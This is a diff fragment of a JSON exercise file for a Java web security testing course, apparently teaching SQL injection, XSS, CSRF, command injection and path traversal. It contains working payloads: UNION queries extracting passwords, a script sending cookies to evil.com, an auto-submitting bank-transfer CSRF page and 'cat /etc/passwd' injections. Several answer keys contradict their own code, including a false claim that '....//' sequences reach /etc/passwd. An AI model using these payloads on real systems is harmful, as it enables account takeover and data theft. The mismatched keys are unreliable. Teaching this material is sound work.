+          "starter_code": "public class BlindSQLi {\n    // Blind SQLi: no error messages, but behaviour differs\n    static String simulateApp(String input) {\n        // Simulates: WHERE id='\" + input + \"'\n        if (input.contains(\"' AND '1'='1\")) return \"Profile loaded (content visible)\";\n        if (input.contains(\"' AND '1'='2\")) return \"Profile loaded (no content)\";\n        if (input.contains(\"' AND SLEEP\")) return \"(5 second delay, then profile loaded)\";\n        return \"Profile loaded normally\";\n    }\n    public static void main(String[] args) {\n        System.out.println(\"=== BLIND SQLi DETECTION ===\");\n        // TODO: Send both payloads and compare responses\n        System.out.println(\"True condition: \" + simulateApp(\"1' AND '1'='1\"));\n        System.out.println(\"False condition: \" + simulateApp(\"1' AND '1'='2\"));\n        System.out.println(\"Time-based: \" + simulateApp(\"1' AND SLEEP(5) --\"));\n        System.out.println(\"\\nConclusion: ___\"); // Is it vulnerable?\n    }\n}",
+          "expected_output": "True condition: Profile loaded (content visible)\nFalse condition: Profile loaded (no content)\nTime-based: (5 second delay, then profile loaded)\n\nConclusion: VULNERABLE - different responses for true/false conditions confirms blind SQLi",
+          "hints": [
+            {
+              "message": "If the app responds DIFFERENTLY to true vs false conditions, blind SQLi is confirmed."
+            },
+            {
+              "message": "True condition shows content, false condition doesn't = the SQL is being evaluated."
+            },
+            {
+              "message": "Different responses for AND '1'='1 vs AND '1'='2 = blind SQLi confirmed. Time delay also confirms."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_17",
+          "title": "Exercise 17: UNION-Based Data Extraction",
+          "description": "Use UNION SELECT to extract data from other tables.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
+          "starter_code": "public class UnionExtract {\n    // The original query selects 2 columns:\n    // SELECT name, email FROM products WHERE id='\" + input + \"'\n    \n    // TODO: Write a UNION payload to extract usernames and passwords\n    // Remember: UNION requires same number of columns!\n    public static void main(String[] args) {\n        String payload = \"\"; // Complete this\n        System.out.println(\"Payload: \" + payload);\n        System.out.println(\"Expected: Shows username and password columns from users table\");\n    }\n}",
+          "expected_output": "Payload: ' UNION SELECT username, password FROM users --\nExpected: Shows username and password columns from users table",
+          "hints": [
+            {
+              "message": "UNION SELECT must have the same number of columns as the original query."
+            },
+            {
+              "message": "Original has 2 columns (name, email). So UNION needs 2: username, password."
+            },
+            {
+              "message": "payload = \"' UNION SELECT username, password FROM users --\""
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_18",
+          "title": "Exercise 18: Test for Second-Order SQLi",
+          "description": "Identify SQL injection that triggers on stored data.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
+          "starter_code": "public class SecondOrderSQLi {\n    // Second-order: malicious input is STORED and triggers later\n    // Step 1: Register with username: admin'--\n    // Step 2: Later, app uses stored username in a query:\n    //   SELECT * FROM profiles WHERE username='\" + storedUsername + \"'\n    //   Becomes: SELECT * FROM profiles WHERE username='admin'--'\n    \n    // TODO: Explain why this is dangerous and how to test for it\n    public static void main(String[] args) {\n        String maliciousUsername = \"admin'--\";\n        String query = \"SELECT * FROM profiles WHERE username='\" + maliciousUsername + \"'\";\n        System.out.println(\"Stored username: \" + maliciousUsername);\n        System.out.println(\"Later query: \" + query);\n        System.out.println(\"Effect: ___\"); // What happens?\n        System.out.println(\"Why dangerous: ___\");\n    }\n}",
+          "expected_output": "Stored username: admin'--\nLater query: SELECT * FROM profiles WHERE username='admin'--'\nEffect: Returns admin's profile (-- comments out closing quote)\nWhy dangerous: The injection happens LATER, not at input time. Input validation at registration may pass but the stored value is malicious.",
+          "hints": [
+            {
+              "message": "Second-order means the payload is stored first and triggers later in a different query."
+            },
+            {
+              "message": "The username admin'-- is valid text to store, but when used in a query later, the -- comments out the rest."
+            },
+            {
+              "message": "Input seems safe when stored. Danger comes when the stored value is used in another query without parameterisation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_19",
+          "title": "Exercise 19: Write SQLi Remediation",
+          "description": "Recommend specific fixes for SQL injection findings.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
+          "starter_code": "public class SQLiRemediation {\n    // TODO: For each vulnerable pattern, write the specific fix\n    public static void main(String[] args) {\n        System.out.println(\"VULNERABLE PATTERN 1:\");\n        System.out.println(\"  String q = \\\"SELECT * FROM users WHERE name='\\\" + input + \\\"'\\\"\");\n        System.out.println(\"  FIX: ___\");\n        \n        System.out.println(\"\\nVULNERABLE PATTERN 2:\");\n        System.out.println(\"  String q = \\\"DELETE FROM orders WHERE id=\\\" + orderId\");\n        System.out.println(\"  FIX: ___\");\n        \n        System.out.println(\"\\nVULNERABLE PATTERN 3:\");\n        System.out.println(\"  Using Statement with string concatenation for all queries\");\n        System.out.println(\"  FIX: ___\");\n    }\n}",
+          "expected_output": "FIX 1: Use PreparedStatement: conn.prepareStatement(\"SELECT * FROM users WHERE name=?\"); ps.setString(1, input);\nFIX 2: Use PreparedStatement: conn.prepareStatement(\"DELETE FROM orders WHERE id=?\"); ps.setInt(1, Integer.parseInt(orderId));\nFIX 3: Replace ALL Statement usage with PreparedStatement throughout the codebase. Use parameterised queries for every database operation.",
+          "hints": [
+            {
+              "message": "The fix is ALWAYS PreparedStatement with ? placeholders."
+            },
+            {
+              "message": "Pattern 1: setString for string input. Pattern 2: setInt for numeric. Pattern 3: project-wide replacement."
+            },
+            {
+              "message": "PreparedStatement for all. Use setString/setInt based on data type. Never concatenate user input into SQL."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_20",
+          "title": "Exercise 20: Complete SQLi Assessment Entry",
+          "description": "Write a full vulnerability report for a SQL injection finding.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
+          "starter_code": "public class SQLiReport {\n    public static void main(String[] args) {\n        // TODO: Fill in a complete vulnerability report:\n        System.out.println(\"VULNERABILITY: SQL Injection in ___\");\n        System.out.println(\"CWE: CWE-___\");\n        System.out.println(\"Severity: ___\");\n        System.out.println(\"Location: ___\");\n        System.out.println(\"\\nReproduction Steps:\");\n        System.out.println(\"  1. ___\");\n        System.out.println(\"  2. ___\");\n        System.out.println(\"  3. ___\");\n        System.out.println(\"\\nPayload: ___\");\n        System.out.println(\"Evidence: ___\");\n        System.out.println(\"\\nCIA: C=___ I=___ A=___\");\n        System.out.println(\"Remediation: ___\");\n    }\n}",
+          "expected_output": "VULNERABILITY: SQL Injection in Login Form\nCWE: CWE-89\nSeverity: CRITICAL\nLocation: /login POST, username parameter\n\nReproduction Steps:\n  1. Navigate to /login\n  2. Enter username: admin' OR '1'='1' --\n  3. Enter any password and click Login\n\nPayload: admin' OR '1'='1' --\nEvidence: Logged in as admin without valid password\n\nCIA: C=HIGH I=HIGH A=HIGH\nRemediation: Use PreparedStatement with parameterised queries",
+          "hints": [
+            {
+              "message": "Include every section: title, CWE, severity, location, steps, payload, evidence, CIA, fix."
+            },
+            {
+              "message": "A complete report must be reproducible — exact URL, parameter, payload, and expected result."
+            },
+            {
+              "message": "Fill all fields. CWE-89, CRITICAL, reproduction steps with exact payload, CIA all HIGH, fix with PreparedStatement."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_21",
+          "title": "Exercise 21: Test for Reflected XSS",
+          "description": "Enter payloads in a search form to detect reflected XSS.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class ReflectedXSS {\n    static String simulateSearch(String query) {\n        // Vulnerable: reflects input directly\n        return \"<p>Results for: \" + query + \"</p>\";\n    }\n    // TODO: Test with payloads and check if they appear unencoded\n    public static void main(String[] args) {\n        String[] payloads = {\"laptop\", \"<script>alert(1)</script>\", \"<img src=x onerror=alert(1)>\"};\n        for (String p : payloads) {\n            String html = simulateSearch(p);\n            boolean xss = html.contains(\"<script\") || html.contains(\"onerror=\");\n            System.out.println(p + \" -> \" + (xss ? \"XSS FOUND!\" : \"Safe\"));\n        }\n    }\n}",
+          "expected_output": "laptop -> Safe\n<script>alert(1)</script> -> XSS FOUND!\n<img src=x onerror=alert(1)> -> XSS FOUND!",
+          "hints": [
+            {
+              "message": "If the payload appears in the HTML without encoding, XSS is possible."
+            },
+            {
+              "message": "Check if < and > are preserved in the output. If yes, the browser will parse them as HTML."
+            },
+            {
+              "message": "Script tag and img onerror both inject because the app does not encode < > characters."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_22",
+          "title": "Exercise 22: Test for Stored XSS",
+          "description": "Check if user-controlled data stored in database renders without encoding.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class StoredXSS {\n    static java.util.Map<String,String> profiles = new java.util.HashMap<>();\n    \n    static void updateProfile(String user, String bio) { profiles.put(user, bio); }\n    \n    static String viewProfile(String user) {\n        return \"<div class='bio'>\" + profiles.getOrDefault(user, \"\") + \"</div>\";\n    }\n    public static void main(String[] args) {\n        // TODO: Store XSS payload in profile, then view it\n        updateProfile(\"attacker\", \"<script>alert('XSS')</script>\");\n        String html = viewProfile(\"attacker\");\n        System.out.println(\"Stored HTML: \" + html);\n        System.out.println(\"XSS present: \" + html.contains(\"<script\"));\n        System.out.println(\"\\nImpact: Every user who views this profile is affected!\");\n    }\n}",
+          "expected_output": "Stored HTML: <div class='bio'><script>alert('XSS')</script></div>\nXSS present: true\n\nImpact: Every user who views this profile is affected!",
+          "hints": [
+            {
+              "message": "Stored XSS is more dangerous than reflected because it affects ALL users who view the page."
+            },
+            {
+              "message": "The payload is saved in the database and rendered every time someone views the profile."
+            },
+            {
+              "message": "XSS stored in profile bio. Every visitor executes the script. Encode output with HTML entities."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_23",
+          "title": "Exercise 23: XSS Filter Bypass",
+          "description": "Test payloads that bypass common XSS filters.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class XSSBypass {\n    // Simple filter: removes <script> tags\n    static String basicFilter(String input) {\n        return input.replaceAll(\"(?i)<script.*?>.*?</script>\", \"\");\n    }\n    public static void main(String[] args) {\n        String[] payloads = {\n            \"<script>alert(1)</script>\",\n            \"<img src=x onerror=alert(1)>\",\n            \"<svg onload=alert(1)>\",\n            \"<ScRiPt>alert(1)</ScRiPt>\",\n            \"<scr<script>ipt>alert(1)</scr</script>ipt>\"\n        };\n        for (String p : payloads) {\n            String filtered = basicFilter(p);\n            boolean bypassed = filtered.contains(\"alert\") && (filtered.contains(\"onerror\") || filtered.contains(\"onload\") || filtered.contains(\"<scr\"));\n            System.out.println(\"Payload: \" + p);\n            System.out.println(\"  After filter: \" + filtered);\n            System.out.println(\"  Bypassed: \" + (bypassed || filtered.contains(\"<img\") || filtered.contains(\"<svg\")));\n            System.out.println();\n        }\n    }\n}",
+          "expected_output": "Payload: <script>alert(1)</script>\n  After filter: \n  Bypassed: false\n\nPayload: <img src=x onerror=alert(1)>\n  After filter: <img src=x onerror=alert(1)>\n  Bypassed: true\n\nPayload: <svg onload=alert(1)>\n  After filter: <svg onload=alert(1)>\n  Bypassed: true",
+          "hints": [
+            {
+              "message": "Filters that only block <script> tags miss many XSS vectors."
+            },
+            {
+              "message": "img onerror, svg onload, and mixed case can bypass basic filters."
+            },
+            {
+              "message": "Output encoding is the ONLY reliable XSS fix. Tag-based filters always have bypasses."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_24",
+          "title": "Exercise 24: XSS Context Analysis",
+          "description": "Determine which XSS payload works in each HTML context.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class XSSContext {\n    public static void main(String[] args) {\n        // TODO: For each context, write the correct XSS payload\n        System.out.println(\"Context 1: <p>USER_INPUT</p>\");\n        System.out.println(\"  Payload: <script>alert(1)</script>\");\n        \n        System.out.println(\"Context 2: <input value='USER_INPUT'>\");\n        System.out.println(\"  Payload: ___\"); // Need to close the attribute\n        \n        System.out.println(\"Context 3: <a href='USER_INPUT'>Click</a>\");\n        System.out.println(\"  Payload: ___\"); // javascript: protocol\n        \n        System.out.println(\"Context 4: <script>var x='USER_INPUT';</script>\");\n        System.out.println(\"  Payload: ___\"); // Close the string and script\n    }\n}",
+          "expected_output": "Context 1: <script>alert(1)</script>\nContext 2: '><script>alert(1)</script><input value='\nContext 3: javascript:alert(1)\nContext 4: ';alert(1);//",
+          "hints": [
+            {
+              "message": "Different HTML contexts need different escape sequences."
+            },
+            {
+              "message": "Context 2: close the quote and tag first. Context 3: use javascript: URL. Context 4: close the JS string."
+            },
+            {
+              "message": "1: direct tag. 2: '> closes attribute+tag. 3: javascript: protocol. 4: '; closes string, then inject."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_25",
+          "title": "Exercise 25: XSS to Cookie Theft",
+          "description": "Demonstrate how XSS steals session cookies.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class XSSCookieTheft {\n    static String simulateBrowser(String html, String cookie) {\n        if (html.contains(\"document.cookie\")) {\n            return \"Cookie stolen: \" + cookie;\n        }\n        return \"Page rendered normally\";\n    }\n    public static void main(String[] args) {\n        String payload = \"<script>document.location='http://evil.com/steal?c='+document.cookie</script>\";\n        System.out.println(\"Payload: \" + payload);\n        System.out.println(simulateBrowser(payload, \"session=abc123\"));\n        System.out.println(\"\\nWith HttpOnly cookie:\");\n        System.out.println(\"  document.cookie returns: '' (empty - protected!)\");\n        System.out.println(\"\\nConclusion: HttpOnly prevents JS cookie access\");\n    }\n}",
+          "expected_output": "Payload: <script>document.location='http://evil.com/steal?c='+document.cookie</script>\nCookie stolen: session=abc123\n\nWith HttpOnly cookie:\n  document.cookie returns: '' (empty - protected!)\n\nConclusion: HttpOnly prevents JS cookie access",
+          "hints": [
+            {
+              "message": "XSS can read document.cookie and send it to an attacker's server."
+            },
+            {
+              "message": "The script redirects to evil.com with the cookie in the URL. HttpOnly prevents this."
+            },
+            {
+              "message": "XSS + document.cookie = session hijacking. Fix: output encoding + HttpOnly cookie flag."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_26",
+          "title": "Exercise 26: Fix XSS Vulnerability",
+          "description": "Implement output encoding to prevent XSS.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class FixXSS {\n    // VULNERABLE:\n    static String vulnerable(String input) {\n        return \"<p>\" + input + \"</p>\";\n    }\n    // TODO: Fix with HTML encoding\n    static String fixed(String input) {\n        return \"\";\n    }\n    public static void main(String[] args) {\n        String payload = \"<script>alert(1)</script>\";\n        System.out.println(\"Vuln: \" + vulnerable(payload));\n        System.out.println(\"Fixed: \" + fixed(payload));\n    }\n}",
+          "expected_output": "Vuln: <p><script>alert(1)</script></p>\nFixed: <p>&lt;script&gt;alert(1)&lt;/script&gt;</p>",
+          "hints": [
+            {
+              "message": "Replace < with &lt; and > with &gt; before inserting into HTML."
+            },
+            {
+              "message": "input.replace(\"<\",\"&lt;\").replace(\">\",\"&gt;\").replace(\"\\\"\",\"&quot;\").replace(\"'\",\"&#x27;\");"
+            },
+            {
+              "message": "return \"<p>\"+input.replace(\"&\",\"&amp;\").replace(\"<\",\"&lt;\").replace(\">\",\"&gt;\")+\"</p>\";"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_27",
+          "title": "Exercise 27: XSS Impact Assessment",
+          "description": "Rate the CIA impact of different XSS scenarios.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class XSSImpact {\n    public static void main(String[] args) {\n        // TODO: Rate CIA for each XSS scenario\n        System.out.println(\"Reflected XSS in search (no sensitive data on page):\");\n        System.out.println(\"  C:___ I:___ A:___\");\n        System.out.println(\"Stored XSS in user profile (executes for all visitors):\");\n        System.out.println(\"  C:___ I:___ A:___\");\n        System.out.println(\"XSS that steals admin session cookie:\");\n        System.out.println(\"  C:___ I:___ A:___\");\n    }\n}",
+          "expected_output": "Reflected XSS: C:LOW I:LOW A:LOW (requires victim to click link)\nStored XSS: C:HIGH I:MEDIUM A:LOW (affects all visitors, steals cookies)\nXSS stealing admin cookie: C:HIGH I:HIGH A:MEDIUM (full admin access via session hijack)",
+          "hints": [
+            {
+              "message": "Consider: who is affected and what can the attacker do with the stolen data?"
+            },
+            {
+              "message": "Reflected=needs victim click (lower). Stored=affects everyone (higher). Admin cookie=full access."
+            },
+            {
+              "message": "Reflected:L/L/L. Stored:H/M/L. Admin steal:H/H/M."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_28",
+          "title": "Exercise 28: Write XSS Report Entry",
+          "description": "Create a vulnerability report for a stored XSS finding.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class XSSReport {\n    public static void main(String[] args) {\n        // TODO: Write complete report entry\n        System.out.println(\"VULNERABILITY: ___\");\n        System.out.println(\"CWE: CWE-___\");\n        System.out.println(\"Severity: ___\");\n        System.out.println(\"Location: ___\");\n        System.out.println(\"Steps: 1.___ 2.___ 3.___ 4.___\");\n        System.out.println(\"Payload: ___\");\n        System.out.println(\"CIA: C=___ I=___ A=___\");\n        System.out.println(\"Fix: ___\");\n    }\n}",
+          "expected_output": "VULNERABILITY: Stored XSS in Profile Bio\nCWE: CWE-79\nSeverity: HIGH\nLocation: /profile/edit, 'bio' field\nSteps: 1.Login 2.Edit profile 3.Enter <script>alert(1)</script> in bio 4.View profile\nPayload: <script>alert(document.cookie)</script>\nCIA: C=HIGH I=MEDIUM A=LOW\nFix: HTML-encode all user output before rendering",
+          "hints": [
+            {
+              "message": "Stored XSS is CWE-79, typically HIGH severity."
+            },
+            {
+              "message": "Include exact field, payload, and evidence that it executes for all viewers."
+            },
+            {
+              "message": "CWE-79, HIGH, location=/profile/edit bio field, full steps, CIA H/M/L, fix=output encoding."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_29",
+          "title": "Exercise 29: DOM-Based XSS Detection",
+          "description": "Identify XSS that occurs entirely in client-side JavaScript.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class DOMBasedXSS {\n    // DOM XSS: the payload never goes to the server\n    // Example: page reads URL fragment and inserts it into DOM\n    // URL: /page#<script>alert(1)</script>\n    // JS: document.getElementById('output').innerHTML = location.hash.substring(1);\n    \n    public static void main(String[] args) {\n        String urlFragment = \"<script>alert(1)</script>\";\n        // Simulate: innerHTML = fragment\n        String rendered = \"<div id='output'>\" + urlFragment + \"</div>\";\n        System.out.println(\"URL fragment: #\" + urlFragment);\n        System.out.println(\"Rendered: \" + rendered);\n        System.out.println(\"XSS: \" + rendered.contains(\"<script\"));\n        System.out.println(\"\\nKey difference: payload in URL fragment (#) never sent to server\");\n        System.out.println(\"Fix: Use textContent instead of innerHTML\");\n    }\n}",
+          "expected_output": "URL fragment: #<script>alert(1)</script>\nRendered: <div id='output'><script>alert(1)</script></div>\nXSS: true\n\nKey difference: payload in URL fragment (#) never sent to server\nFix: Use textContent instead of innerHTML",
+          "hints": [
+            {
+              "message": "DOM XSS happens when JavaScript reads untrusted data and writes it to the DOM."
+            },
+            {
+              "message": "innerHTML interprets HTML tags. textContent treats everything as text."
+            },
+            {
+              "message": "DOM XSS: client-side only, use textContent not innerHTML. Server-side logs won't show it."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_30",
+          "title": "Exercise 30: XSS in Different Output Contexts",
+          "description": "Test XSS when output appears in various HTML locations.",
+          "difficulty": "intermediate",
+          "category": "XSS Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "XSS is found in over 60% of web apps. Let's hunt for it!",
+          "starter_code": "public class XSSOutputContexts {\n    public static void main(String[] args) {\n        String input = \"user_input\";\n        // TODO: For each context, explain which encoding is needed\n        System.out.println(\"1. HTML body: <p>\" + input + \"</p>\");\n        System.out.println(\"   Encoding needed: ___\");\n        System.out.println(\"2. HTML attribute: <input value='\" + input + \"'>\");\n        System.out.println(\"   Encoding needed: ___\");\n        System.out.println(\"3. JavaScript: var x = '\" + input + \"';\");\n        System.out.println(\"   Encoding needed: ___\");\n        System.out.println(\"4. URL parameter: /search?q=\" + input);\n        System.out.println(\"   Encoding needed: ___\");\n    }\n}",
+          "expected_output": "1. HTML body: HTML entity encoding (&lt; &gt; &amp;)\n2. HTML attribute: Attribute encoding (escape quotes too)\n3. JavaScript: JavaScript encoding (escape ' and \\)\n4. URL parameter: URL encoding (%20, %3C, %3E)",
+          "hints": [
+            {
+              "message": "Each context has different dangerous characters."
+            },
+            {
+              "message": "HTML body: < >. Attributes: quotes. JavaScript: quotes and backslash. URLs: special chars."
+            },
+            {
+              "message": "1.HTML entities 2.Attribute encoding 3.JS encoding 4.URL encoding. Each context needs its OWN encoding type."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_31",
+          "title": "Exercise 31: CSRF Token Validation",
+          "description": "Check if a form properly validates its CSRF token.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
+          "starter_code": "public class CSRFValidation {\n    // TODO: Test if the server validates the token\n    // Test 1: Submit form with valid token -> should work\n    // Test 2: Submit form with no token -> should fail\n    // Test 3: Submit form with wrong token -> should fail\n    public static void main(String[] args) {\n        System.out.println(\"Test 1 (valid token): \" + submitForm(\"abc123\", \"abc123\")); // PASS\n        System.out.println(\"Test 2 (no token): \" + submitForm(null, \"abc123\"));       // FAIL\n        System.out.println(\"Test 3 (wrong token): \" + submitForm(\"wrong\", \"abc123\")); // FAIL\n    }\n    static String submitForm(String submitted, String expected) {\n        if (submitted == null) return \"REJECTED (no token)\";\n        if (!submitted.equals(expected)) return \"REJECTED (invalid token)\";\n        return \"ACCEPTED\";\n    }\n}",
+          "expected_output": "Test 1 (valid token): ACCEPTED\nTest 2 (no token): REJECTED (no token)\nTest 3 (wrong token): REJECTED (invalid token)",
+          "hints": [
+            {
+              "message": "A properly validated CSRF token must be: present, correct, and checked on every state-changing request."
+            },
+            {
+              "message": "If test 2 or 3 succeeds, the server doesn't validate the token properly — still vulnerable!"
+            },
+            {
+              "message": "Valid=accepted. Missing or wrong=rejected. All three tests must pass for proper CSRF protection."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_32",
+          "title": "Exercise 32: Craft a CSRF Attack Page",
+          "description": "Create an HTML page that exploits a CSRF-vulnerable form.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
+          "starter_code": "public class CraftCSRF {\n    // TODO: Write the HTML for a CSRF attack page\n    // Target: POST /transfer with fields 'to' and 'amount'\n    public static void main(String[] args) {\n        String attackPage = \"<html><body onload='document.forms[0].submit()'>\\n\"\n            + \"<form action='http://bank.com/transfer' method='POST'>\\n\"\n            + \"  <input type='hidden' name='to' value='attacker'>\\n\"\n            + \"  <input type='hidden' name='amount' value='10000'>\\n\"\n            + \"</form></body></html>\";\n        System.out.println(\"Attack page:\");\n        System.out.println(attackPage);\n        System.out.println(\"\\nHow it works: page auto-submits when loaded.\");\n        System.out.println(\"Victim's browser includes their session cookie automatically.\");\n    }\n}",
+          "expected_output": "Attack page:\n<html><body onload='document.forms[0].submit()'>\n<form action='http://bank.com/transfer' method='POST'>\n  <input type='hidden' name='to' value='attacker'>\n  <input type='hidden' name='amount' value='10000'>\n</form></body></html>\n\nHow it works: page auto-submits when loaded.\nVictim's browser includes their session cookie automatically.",
+          "hints": [
+            {
+              "message": "The attack page has hidden form fields pre-filled with attacker's values."
+            },
+            {
+              "message": "onload='document.forms[0].submit()' auto-submits. Browser sends victim's cookies."
+            },
+            {
+              "message": "Hidden form + auto-submit + victim's cookies = CSRF. Fix: anti-CSRF tokens."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_33",
+          "title": "Exercise 33: Command Injection Payloads",
+          "description": "Test multiple command injection techniques.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
+          "starter_code": "public class CmdInjPayloads {\n    static boolean testPayload(String input) {\n        return input.contains(\";\") || input.contains(\"|\") || input.contains(\"&&\")\n            || input.contains(\"`\") || input.contains(\"$(\");\n    }\n    public static void main(String[] args) {\n        String[] payloads = {\n            \"127.0.0.1\", \"127.0.0.1; whoami\", \"127.0.0.1 | ls\",\n            \"127.0.0.1 && cat /etc/passwd\", \"`whoami`\", \"$(id)\"\n        };\n        for (String p : payloads) {\n            System.out.println(p + \" -> \" + (testPayload(p) ? \"INJECTION DETECTED\" : \"Clean\"));\n        }\n    }\n}",
+          "expected_output": "127.0.0.1 -> Clean\n127.0.0.1; whoami -> INJECTION DETECTED\n127.0.0.1 | ls -> INJECTION DETECTED\n127.0.0.1 && cat /etc/passwd -> INJECTION DETECTED\n`whoami` -> INJECTION DETECTED\n$(id) -> INJECTION DETECTED",
+          "hints": [
+            {
+              "message": "Shell metacharacters like ; | && ` $() all enable command chaining."
+            },
+            {
+              "message": "Each character has a different effect: ; = sequential, | = pipe, && = conditional, ` = substitution."
+            },
+            {
+              "message": "All except the normal IP are detected. 5 different injection techniques identified."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_34",
+          "title": "Exercise 34: Fix Command Injection",
+          "description": "Refactor code to prevent command injection.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
+          "starter_code": "public class FixCmdInj {\n    // VULNERABLE:\n    static void pingVulnerable(String host) throws Exception {\n        Runtime.getRuntime().exec(\"sh -c ping -c 1 \" + host);\n    }\n    // TODO: Fix with input validation\n    static void pingFixed(String host) throws Exception {\n        // Only allow IP addresses\n    }\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"Testing fix:\");\n        System.out.println(\"192.168.1.1 -> \" + isValidIP(\"192.168.1.1\"));\n        System.out.println(\"192.168.1.1; whoami -> \" + isValidIP(\"192.168.1.1; whoami\"));\n    }\n    static boolean isValidIP(String input) {\n        return input.matches(\"^[0-9]{1,3}(\\\\.[0-9]{1,3}){3}$\");\n    }\n}",
+          "expected_output": "Testing fix:\n192.168.1.1 -> true\n192.168.1.1; whoami -> false",
+          "hints": [
+            {
+              "message": "Whitelist allowed characters: only digits and dots for an IP address."
+            },
+            {
+              "message": "Regex ^[0-9]{1,3}(\\.[0-9]{1,3}){3}$ allows only valid IP format."
+            },
+            {
+              "message": "Validate input with whitelist regex. Reject anything that doesn't match. Never pass raw input to exec()."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_35",
+          "title": "Exercise 35: Path Traversal Detection",
+          "description": "Test if a file download endpoint is vulnerable.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
+          "starter_code": "import java.io.File;\n\npublic class PathTraversalDetect {\n    static String testPath(String base, String input) {\n        try {\n            File resolved = new File(base, input).getCanonicalFile();\n            boolean escaped = !resolved.getPath().startsWith(new File(base).getCanonicalPath());\n            return input + \" -> \" + (escaped ? \"TRAVERSAL!\" : \"Safe\") + \" (\" + resolved.getPath() + \")\";\n        } catch (Exception e) { return \"Error\"; }\n    }\n    public static void main(String[] args) {\n        String base = \"/var/www/files\";\n        String[] tests = {\"report.pdf\", \"../../../etc/passwd\", \"....//....//etc/passwd\", \"subdir/file.txt\"};\n        for (String t : tests) System.out.println(testPath(base, t));\n    }\n}",
+          "expected_output": "report.pdf -> Safe (/var/www/files/report.pdf)\n../../../etc/passwd -> TRAVERSAL! (/etc/passwd)\n....//....//etc/passwd -> TRAVERSAL! (/etc/passwd)\nsubdir/file.txt -> Safe (/var/www/files/subdir/file.txt)",
+          "hints": [
+            {
+              "message": "Path traversal uses ../ to escape the intended directory."
+            },
+            {
+              "message": "getCanonicalFile() resolves all ../ sequences. Check if result starts with base dir."
+            },
+            {
+              "message": "2 of 4 escape the base directory. Fix: canonicalize and verify startsWith(baseDir)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_36",
+          "title": "Exercise 36: Fix Path Traversal",
+          "description": "Implement safe file access with canonical path validation.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
